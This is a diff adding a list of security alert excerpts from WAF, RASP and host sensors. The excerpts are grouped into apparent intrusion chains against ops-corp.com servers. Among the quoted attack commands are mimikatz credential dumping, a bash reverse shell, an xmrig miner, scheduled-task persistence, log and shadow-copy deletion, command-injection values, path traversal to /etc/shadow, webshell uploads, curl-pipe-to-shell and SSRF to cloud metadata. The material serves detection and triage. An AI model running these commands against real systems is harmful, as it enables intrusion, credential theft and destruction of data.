@@ -1,0 +1,101 @@
+1. `2026-06-02 02:14:00` **[hids]** `HID0224980`
+    `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" mimikatz.exe cmd.exe /c C:\Windows\Temp\m.exe <== /`
+
+1. `2026-06-14 07:08:35` **[waf]** `WAF0292058`
+    `/api/v1/scheduler/run cmd=schtasks /create /tn Upd /sc minute /mo 5 /tr C:\Windows\Temp\u.exe Mozilla/5.0 (Win`
+2. `2026-06-14 07:08:36` **[rasp]** `RASP0323127`
+    `https://app-tomcat-47.ops-corp.com/api/v1/scheduler/run {"cmd_inject": "schtasks /create /sc minute", "sched_t`
+3. `2026-06-14 07:10:02` **[hids]** `HID0316510`
+    `schtasks /create /tn Upd /sc minute /mo 5 /tr C:\Windows\Temp\u.exe schtasks.exe java.exe -jar C:\svc\gw.jar <`
+
+1. `2026-06-23 22:37:25` **[hids]** `HID0388830`
+    `sc create SmSvc binPath= C:\Windows\Temp\svc.exe start= auto sc.exe cmd.exe /c sc create SmSvc binPath= C:\Win`
+
+1. `2026-06-19 05:44:24` **[hids]** `HID0353559`
+    `bash -i >& /dev/tcp/10.20.5.19/8443 0>&1 /bin/bash bash -i <== /bin/sh -c 'bash -i' <== nginx: worker process`
+
+1. `2026-06-08 18:18:52` **[hids]** `HID0274999`
+    `xmrig -o stratum+tcp://10.20.5.77:3333 -u 4ANf8kQ -p x xmrig xmrig <== /bin/sh -c '/tmp/.kr/xmrig -o st'`
+
+1. `2026-06-22 04:42:44` **[waf]** `WAF0346717`
+    `/backup/export src=../../etc/shadow&dst=/tmp/.cache.tgz Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KH`
+2. `2026-06-22 04:44:12` **[hids]** `HID0375743`
+    `tar czf /tmp/.cache /etc/shadow /etc/passwd tar czf /tmp/.cache <== /bin/sh -c 'tar' <== nginx: worker process`
+
+1. `2026-06-23 10:52:06` **[hids]** `HID0385157`
+    `wevtutil cl Security && vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c wevtutil cl Security && vss <==`
+
+1. `2026-06-07 22:44:39` **[rasp]** `RASP0274505`
+    `https://app-tomcat-38.ops-corp.com/uploads/shell.jsp {"webshell": "shell.jsp", "cmd": "id"} Mozilla/5.0 (Windo`
+2. `2026-06-07 22:45:36` **[hids]** `HID0268889`
+    `id /usr/bin/id id <== /bin/sh -c 'id' <== /usr/local/tomcat/bin/catalina.sh`
+
+1. `2026-06-13 06:14:34` **[rasp]** `RASP0315182`
+    `https://app-php-92.ops-corp.com/uploads/up.php {"upload": "shell.php", "act": "upload"} Mozilla/5.0 (Macintosh`
+2. `2026-06-13 06:15:31` **[hids]** `HID0308727`
+    `mv /tmp/php3f2a.tmp /var/www/html/shell.php /bin/mv mv <== /bin/sh -c 'mv /tmp/php3f' <== php-fpm: pool www`
+
+1. `2026-06-17 11:43:24` **[rasp]** `RASP0347559`
+    `https://app-iis-20.ops-corp.com/upload/cmd.aspx {"webshell": "cmd.aspx", "cmd": "whoami"} Mozilla/5.0 (Windows`
+2. `2026-06-17 11:45:19` **[hids]** `HID0340441`
+    `whoami /all C:\Windows\System32\whoami.exe whoami /all <== cmd.exe /c whoami /all <== w3wp.exe -ap "DefaultApp`
+
+1. `2026-06-27 05:17:05` **[rasp]** `RASP0422075`
+    `https://app-spring-18.ops-corp.com/api/v1/upload/gateway {"cmd": "id;whoami", "payload_enc": "base64-aes"} Moz`
+2. `2026-06-27 05:18:00` **[hids]** `HID0413414`
+    `id;whoami /bin/bash id;whoami <== /bin/sh -c 'id;whoami' <== java -jar /opt/app/gw.jar`
+
+1. `2026-06-25 14:39:38` **[rasp]** `RASP0409752`
+    `https://app-go-27.ops-corp.com/api/v1/convert {"cmd_inject": "|id", "lang": "go"} Mozilla/5.0 (X11; Linux x86_`
+2. `2026-06-25 14:41:06` **[hids]** `HID0401348`
+    `cat /etc/hosts /bin/cat cat /etc/hosts <== /bin/sh -c 'cat /etc/hosts' <== /opt/app/apiserver`
+
+1. `2026-06-05 03:32:52` **[waf]** `WAF0228741`
+    `/api/v2/proxy/exec ip=10.20.3.14;id;cat /etc/hostname Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537`
+2. `2026-06-05 03:32:53` **[rasp]** `RASP0253066`
+    `https://app-go-64.ops-corp.com/api/v2/proxy/exec {"cmd_inject": ";id;cat /etc/hostname", "gw": true} Mozilla/5`
+3. `2026-06-05 03:34:52` **[hids]** `HID0247898`
+    `curl -sS http://10.20.6.88:8080/api/v1/users /usr/bin/curl curl -sS <== /bin/sh -c 'curl' <== api-gw`
+
+1. `2026-06-06 13:11:50` **[waf]** `WAF0238444`
+    `/grpc.gateway.Exec/Start 1:{"cmd":"x;id;uname -a"} 5:true Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS `
+2. `2026-06-06 13:11:52` **[rasp]** `RASP0263802`
+    `https://app-go-71.ops-corp.com/grpc.gateway.Exec/Start {"cmd_inject": "x;id;uname -a", "grpc_web": true} Mozil`
+3. `2026-06-06 13:12:51` **[hids]** `HID0258407`
+    `id;uname -a /usr/bin/id id;uname -a <== /bin/sh -c 'id;uname -a' <== /opt/app/grpc-gw`
+
+1. `2026-06-26 07:43:27` **[waf]** `WAF0375266`
+    `/api/v1/namespaces/default/pods {"metadata":{"name":"p1"},"cmd":["sh","-c","id"]} Mozilla/5.0 (Linux; Android `
+2. `2026-06-26 07:43:28` **[rasp]** `RASP0415196`
+    `https://app-node-45.ops-corp.com/api/v1/namespaces/default/pods {"container_api": "pods", "cmd": "id"} Mozilla`
+3. `2026-06-26 07:44:26` **[hids]** `HID0406677`
+    `sh -c id /bin/sh sh -c id <== /usr/bin/containerd-shim <== kubelet --config=/var/lib/kubelet`
+
+1. `2026-06-22 00:01:55` **[waf]** `WAF0345368`
+    `/api/definitions {"parameters":[{"name":"cmd","value":"/tmp/.rb/run"}]} Mozilla/5.0 (iPhone; CPU iPhone OS 17_`
+2. `2026-06-22 00:01:57` **[rasp]** `RASP0382114`
+    `https://app-java-58.ops-corp.com/api/definitions {"unauth": "/api/definitions", "cmd": "/tmp/.rb/run"} Mozilla`
+3. `2026-06-22 00:02:56` **[hids]** `HID0374278`
+    `sh -c /tmp/.rb/run /bin/sh sh -c /tmp/.rb/run <== beam.smp -W w -A 64 -- -root <== rabbitmq-server`
+
+1. `2026-06-15 02:44:02` **[waf]** `WAF0297707`
+    `/phpmyadmin/import.php sql=SELECT "<?php passthru($_GET[c]);?>" INTO OUTFILE "/var/www/x.php" Mozilla/5.0 (Win`
+2. `2026-06-15 02:44:03` **[rasp]** `RASP0329377`
+    `https://app-php-66.ops-corp.com/phpmyadmin/import.php {"sql_write": "INTO OUTFILE /var/www/x.php", "webshell":`
+3. `2026-06-15 02:45:04` **[hids]** `HID0322629`
+    `chmod 755 /var/www/x.php /bin/chmod chmod 755 /var/www/x.php <== /bin/sh -c 'chmod 755' <== php-fpm: pool www`
+
+1. `2026-06-26 09:54:23` **[waf]** `WAF0375895`
+    `/api/v1/backup/download file=../../../../etc/app/config.yml&mode=raw Mozilla/5.0 (Linux; Android 14; Pixel 8) `
+2. `2026-06-26 09:55:51` **[hids]** `HID0407361`
+    `cat /etc/app/cfg.yml /bin/cat cat /etc/app/cfg.yml <== /bin/sh -c 'cat /etc/app/cfg.yml' <== /opt/app/backupd`
+
+1. `2026-06-10 18:20:21` **[waf]** `WAF0267606`
+    `/api/upload/avatar filename=.htaccess&content=AddType application%2fx-httpd-php+png Mozilla/5.0 (Linux; Androi`
+2. `2026-06-10 18:21:19` **[hids]** `HID0290010`
+    `curl -s http://10.20.7.31/px.sh | sh /bin/sh sh -c curl -s http://10.20.7.31/px.sh <== apache2`
+
+1. `2026-06-04 20:07:07` **[waf]** `WAF0226599`
+    `/api/v1/fetch/image url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Mozilla/5.0 (Linux; `
+2. `2026-06-04 20:09:05` **[hids]** `HID0245577`
+    `curl -s http://10.20.8.5:8500/v1/kv/?recurse /usr/bin/curl curl <== java -jar /opt/app/fetcher.jar`
